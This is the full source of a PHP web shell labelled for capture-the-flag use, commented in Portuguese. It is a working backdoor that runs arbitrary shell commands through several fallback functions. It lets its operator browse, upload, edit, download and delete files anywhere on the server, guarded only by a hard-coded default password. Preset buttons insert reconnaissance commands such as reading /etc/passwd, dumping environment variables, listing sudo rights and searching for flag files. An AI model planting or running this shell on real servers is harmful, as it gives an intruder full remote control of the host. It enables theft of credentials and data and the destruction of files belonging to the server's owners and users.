<?php
/**
 * PHP Shell CTF - Versão Melhorada
 * - Navegação corrigida após editar arquivos
 * - Executor de comandos shell integrado
 * - Interface aprimorada
 */

// ========================================
// CONFIGURAÇÃO
// ========================================
$PASSWORD = 'teste123';  // ← MUDE ISSO!
$MAX_UPLOAD_SIZE = 50 * 1024 * 1024; // 50MB

// Autenticação simples
session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>PHP Shell - Login</title>
            <style>
                body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-box { background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 5px; }
                input[type="password"] { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 250px; font-family: monospace; }
                button { background: #0f0; color: #000; border: none; padding: 10px 30px; cursor: pointer; font-weight: bold; margin-top: 10px; }
                button:hover { background: #0c0; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 PHP Shell Login</h2>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Password" autofocus>
                    <br><button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Diretório inicial - CORRIGIDO: preserva o diretório do POST
$current_dir = isset($_POST['current_dir']) ? realpath($_POST['current_dir']) : (isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__);
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = __DIR__;
}

// ========================================
// AÇÕES
// ========================================

// Executar comando shell
$cmd_output = '';
$cmd_executed = '';
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmd_executed = htmlspecialchars($cmd);
    
    // Tenta vários métodos de execução
    if (function_exists('shell_exec')) {
        $cmd_output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output_arr);
        $cmd_output = implode("\n", $output_arr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $cmd_output = stream_get_contents($pipes[1]);
            $cmd_output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    } else {
        $cmd_output = "❌ Nenhuma função de execução disponível (shell_exec, exec, system, passthru, proc_open)";
    }
    
    if (empty($cmd_output)) {
        $cmd_output = "(comando executado sem output)";
    }
}

// Upload de arquivo
if (isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = "✅ Upload: " . basename($_FILES['upload_file']['name']);
    } else {
        $message = "❌ Erro no upload";
    }
}

// Criar arquivo
if (isset($_POST['create_file'])) {
    $new_file = $current_dir . '/' . $_POST['filename'];
    if (file_put_contents($new_file, '') !== false) {
        $message = "✅ Arquivo criado: " . $_POST['filename'];
    } else {
        $message = "❌ Erro ao criar arquivo";
    }
}

// Criar pasta
if (isset($_POST['create_dir'])) {
    $new_dir = $current_dir . '/' . $_POST['dirname'];
    if (mkdir($new_dir)) {
        $message = "✅ Pasta criada: " . $_POST['dirname'];
    } else {
        $message = "❌ Erro ao criar pasta";
    }
}

// Deletar
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    if ($file && file_exists($file)) {
        if (is_dir($file)) {
            if (rmdir($file)) {
                $message = "✅ Pasta deletada";
            } else {
                $message = "❌ Erro: pasta não vazia";
            }
        } else {
            if (unlink($file)) {
                $message = "✅ Arquivo deletado";
            } else {
                $message = "❌ Erro ao deletar";
            }
        }
    }
}

// Salvar arquivo editado - CORRIGIDO: preserva o diretório
if (isset($_POST['save_file'])) {
    $file = $_POST['file_path'];
    if (file_put_contents($file, $_POST['file_content']) !== false) {
        $message = "✅ Arquivo salvo: " . basename($file);
        // Redireciona de volta para o diretório correto
        $redirect_dir = dirname($file);
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($redirect_dir));
        exit;
    } else {
        $message = "❌ Erro ao salvar";
    }
}

// Download
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ========================================
// HTML/CSS
// ========================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP Shell - <?php echo basename($current_dir); ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            font-size: 14px;
            padding: 20px;
        }
        
        .header {
            background: #111;
            border: 2px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .header h1 {
            color: #0f0;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .info-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #0f0;
        }
        
        .current-path {
            color: #ff0;
            font-weight: bold;
            margin-bottom: 15px;
            padding: 10px;
            background: #111;
            border: 1px solid #ff0;
            border-radius: 3px;
        }
        
        .message {
            background: #0f0;
            color: #000;
            padding: 10px;
            margin-bottom: 15px;
            font-weight: bold;
            border-radius: 3px;
        }
        
        .message.error {
            background: #f00;
            color: #fff;
        }
        
        /* SHELL EXECUTOR */
        .shell-executor {
            background: #111;
            border: 2px solid #f0f;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .shell-executor h3 {
            color: #f0f;
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .shell-executor input[type="text"] {
            background: #000;
            color: #f0f;
            border: 1px solid #f0f;
            padding: 10px;
            font-family: monospace;
            width: calc(100% - 120px);
            font-size: 14px;
        }
        
        .shell-executor button {
            background: #f0f;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
            margin-left: 10px;
        }
        
        .shell-executor button:hover {
            background: #d0d;
        }
        
        .cmd-output {
            background: #000;
            color: #0ff;
            border: 1px solid #0ff;
            padding: 15px;
            margin-top: 15px;
            border-radius: 3px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
            min-height: 100px;
        }
        
        .cmd-info {
            color: #ff0;
            margin-top: 10px;
            font-size: 12px;
        }
        
        /* ACTIONS */
        .actions {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .actions form {
            display: inline-block;
            margin-right: 15px;
            margin-bottom: 10px;
        }
        
        .actions input[type="text"],
        .actions input[type="file"] {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px;
            font-family: monospace;
        }
        
        .actions button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        
        .actions button:hover {
            background: #0c0;
        }
        
        .file-list {
            background: #111;
            border: 2px solid #0f0;
            border-radius: 5px;
            overflow: hidden;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: #0f0;
            color: #000;
            padding: 12px;
            text-align: left;
            font-weight: bold;
        }
        
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #222;
        }
        
        tr:hover {
            background: #222;
        }
        
        a {
            color: #0ff;
            text-decoration: none;
        }
        
        a:hover {
            color: #0f0;
            text-decoration: underline;
        }
        
        .action-link {
            display: inline-block;
            margin-right: 10px;
            color: #0ff;
            font-size: 12px;
        }
        
        .action-link.danger {
            color: #f00;
        }
        
        .icon {
            margin-right: 5px;
        }
        
        .editor {
            background: #111;
            border: 2px solid #0f0;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .editor h2 {
            color: #0f0;
            margin-bottom: 15px;
        }
        
        .editor textarea {
            width: 100%;
            min-height: 500px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 3px;
            resize: vertical;
        }
        
        .btn-group {
            margin-top: 15px;
        }
        
        .btn {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
            text-decoration: none;
            display: inline-block;
            margin-right: 10px;
            border-radius: 3px;
        }
        
        .btn:hover {
            background: #0c0;
        }
        
        .btn-secondary {
            background: #666;
            color: #fff;
        }
        
        .perms {
            color: #ff0;
        }
        
        .size {
            color: #0ff;
        }

        /* QUICK COMMANDS */
        .quick-cmds {
            background: #0a0a0a;
            padding: 10px;
            margin-top: 10px;
            border-radius: 3px;
            border: 1px solid #333;
        }

        .quick-cmds button {
            background: #222;
            color: #0ff;
            border: 1px solid #0ff;
            padding: 5px 10px;
            margin: 2px;
            cursor: pointer;
            font-size: 11px;
            font-family: monospace;
            border-radius: 3px;
        }

        .quick-cmds button:hover {
            background: #0ff;
            color: #000;
        }
    </style>
    <script>
        function insertCmd(cmd) {
            document.getElementById('cmd_input').value = cmd;
            document.getElementById('cmd_input').focus();
        }
    </script>
</head>
<body>

<div class="header">
    <h1>🐚 PHP Shell CTF</h1>
    <div class="info-bar">
        <div>
            <span>PHP: <?php echo phpversion(); ?></span> | 
            <span>User: <?php echo get_current_user(); ?></span> | 
            <span>OS: <?php echo PHP_OS; ?></span> | 
            <span><a href="?logout=1" style="color:#f00">Logout</a></span>
        </div>
    </div>
</div>

<?php if (isset($message)): ?>
    <div class="message <?php echo strpos($message, '❌') !== false ? 'error' : ''; ?>">
        <?php echo $message; ?>
    </div>
<?php endif; ?>

<!-- EXECUTOR DE COMANDOS SHELL -->
<div class="shell-executor">
    <h3>💀 Shell Command Executor</h3>
    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" id="cmd_input" name="cmd" placeholder="Digite o comando (ex: ls -la, whoami, id, uname -a)" 
               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autofocus>
        <button type="submit">▶ Executar</button>
    </form>
    
    <div class="quick-cmds">
        <strong style="color:#888;">Quick Commands:</strong>
        <button onclick="insertCmd('whoami')">whoami</button>
        <button onclick="insertCmd('id')">id</button>
        <button onclick="insertCmd('pwd')">pwd</button>
        <button onclick="insertCmd('uname -a')">uname -a</button>
        <button onclick="insertCmd('ls -la')">ls -la</button>
        <button onclick="insertCmd('cat /etc/passwd')">cat /etc/passwd</button>
        <button onclick="insertCmd('env')">env</button>
        <button onclick="insertCmd('ps aux')">ps aux</button>
        <button onclick="insertCmd('netstat -tuln')">netstat</button>
        <button onclick="insertCmd('find / -name flag.txt 2>/dev/null')">find flag</button>
        <button onclick="insertCmd('cat /proc/version')">kernel</button>
        <button onclick="insertCmd('sudo -l')">sudo -l</button>
    </div>
    
    <?php if (!empty($cmd_output)): ?>
    <div class="cmd-info">
        ▸ Comando executado: <strong><?php echo $cmd_executed; ?></strong>
    </div>
    <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
    <?php endif; ?>
</div>

<div class="current-path">
    📂 Caminho Atual: <?php 
    $parts = explode('/', $current_dir);
    $path = '';
    foreach ($parts as $i => $part) {
        if (empty($part)) continue;
        $path .= '/' . $part;
        if ($i < count($parts) - 1) {
            echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a> / ';
        } else {
            echo '<strong>' . htmlspecialchars($part) . '</strong>';
        }
    }
    ?>
</div>

<div class="actions">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="file" name="upload_file" required>
        <button type="submit">📤 Upload</button>
    </form>
    
    <form method="POST" style="display:inline">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" name="filename" placeholder="novo-arquivo.txt" required>
        <button type="submit" name="create_file">📄 Criar Arquivo</button>
    </form>
    
    <form method="POST" style="display:inline">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" name="dirname" placeholder="nova-pasta" required>
        <button type="submit" name="create_dir">📁 Criar Pasta</button>
    </form>
</div>

<?php
// ========================================
// EDITOR DE ARQUIVO
// ========================================
if (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);
    if ($file && is_file($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $file_dir = dirname($file); // Captura o diretório do arquivo
        ?>
        <div class="editor">
            <h2>✏️ Editando: <?php echo htmlspecialchars(basename($file)); ?></h2>
            <div style="color:#888; margin-bottom:10px;">
                📁 <?php echo htmlspecialchars($file); ?>
            </div>
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file); ?>">
                <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($file_dir); ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($content); ?></textarea>
                <div class="btn-group">
                    <button type="submit" name="save_file" class="btn">💾 Salvar</button>
                    <a href="?dir=<?php echo urlencode($file_dir); ?>" class="btn btn-secondary">❌ Cancelar</a>
                </div>
            </form>
        </div>
        <?php
        echo '</body></html>';
        exit;
    }
}

// ========================================
// VISUALIZAR ARQUIVO
// ========================================
if (isset($_GET['view'])) {
    $file = realpath($_GET['view']);
    if ($file && is_file($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $file_dir = dirname($file);
        ?>
        <div class="editor">
            <h2>👁️ Visualizando: <?php echo htmlspecialchars(basename($file)); ?></h2>
            <div style="color:#888; margin-bottom:10px;">
                📁 <?php echo htmlspecialchars($file); ?>
            </div>
            <textarea readonly><?php echo htmlspecialchars($content); ?></textarea>
            <div class="btn-group">
                <a href="?dir=<?php echo urlencode($file_dir); ?>" class="btn btn-secondary">← Voltar</a>
                <a href="?download=<?php echo urlencode($file); ?>" class="btn">💾 Download</a>
            </div>
        </div>
        <?php
        echo '</body></html>';
        exit;
    }
}

// ========================================
// LISTAGEM DE ARQUIVOS
// ========================================
$items = scandir($current_dir);
$dirs = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    
    $path = $current_dir . '/' . $item;
    $stat = @stat($path);
    
    $info = [
        'name' => $item,
        'path' => $path,
        'size' => $stat ? $stat['size'] : 0,
        'modified' => $stat ? $stat['mtime'] : 0,
        'perms' => $stat ? substr(sprintf('%o', $stat['mode']), -4) : '????',
        'is_readable' => is_readable($path),
        'is_writable' => is_writable($path),
    ];
    
    if (is_dir($path)) {
        $dirs[] = $info;
    } else {
        $files[] = $info;
    }
}

// Ordenar
usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });

$items = array_merge($dirs, $files);
?>

<div class="file-list">
    <table>
        <thead>
            <tr>
                <th>Nome</th>
                <th>Tamanho</th>
                <th>Permissões</th>
                <th>Modificado</th>
                <th>Ações</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($current_dir !== '/'): ?>
            <tr>
                <td>
                    <span class="icon">📁</span>
                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>"><strong>..</strong></a>
                </td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php endif; ?>
            
            <?php foreach ($items as $item): ?>
            <tr>
                <td>
                    <?php if (is_dir($item['path'])): ?>
                        <span class="icon">📁</span>
                        <a href="?dir=<?php echo urlencode($item['path']); ?>">
                            <strong><?php echo htmlspecialchars($item['name']); ?></strong>
                        </a>
                    <?php else: ?>
                        <span class="icon">📄</span>
                        <?php echo htmlspecialchars($item['name']); ?>
                    <?php endif; ?>
                </td>
                <td class="size">
                    <?php 
                    if (is_dir($item['path'])) {
                        echo '-';
                    } else {
                        $size = $item['size'];
                        if ($size > 1024*1024) {
                            echo number_format($size / (1024*1024), 2) . ' MB';
                        } elseif ($size > 1024) {
                            echo number_format($size / 1024, 2) . ' KB';
                        } else {
                            echo $size . ' B';
                        }
                    }
                    ?>
                </td>
                <td class="perms"><?php echo $item['perms']; ?></td>
                <td><?php echo date('Y-m-d H:i', $item['modified']); ?></td>
                <td>
                    <?php if (!is_dir($item['path'])): ?>
                        <a href="?view=<?php echo urlencode($item['path']); ?>" class="action-link">👁️ Ver</a>
                        <a href="?edit=<?php echo urlencode($item['path']); ?>" class="action-link">✏️ Editar</a>
                        <a href="?download=<?php echo urlencode($item['path']); ?>" class="action-link">⬇️ Download</a>
                    <?php endif; ?>
                    <a href="?delete=<?php echo urlencode($item['path']); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                       class="action-link danger"
                       onclick="return confirm('Deletar <?php echo htmlspecialchars($item['name']); ?>?')">🗑️ Deletar</a>
                </td>
            </tr>
            <?php endforeach; ?>
            
            <?php if (empty($items)): ?>
            <tr>
                <td colspan="5" style="text-align:center; color:#666;">Pasta vazia</td>
            </tr>
            <?php endif; ?>
        </tbody>
    </table>
</div>

<div style="margin-top: 20px; padding: 15px; background: #111; border: 1px solid #0f0; border-radius: 5px;">
    <strong>📊 Estatísticas:</strong>
    <?php echo count($dirs); ?> pastas | <?php echo count($files); ?> arquivos
    <?php
    $total_size = array_sum(array_column($files, 'size'));
    if ($total_size > 1024*1024) {
        echo ' | Total: ' . number_format($total_size / (1024*1024), 2) . ' MB';
    } elseif ($total_size > 1024) {
        echo ' | Total: ' . number_format($total_size / 1024, 2) . ' KB';
    }
    ?>
</div>

</body>
</html>
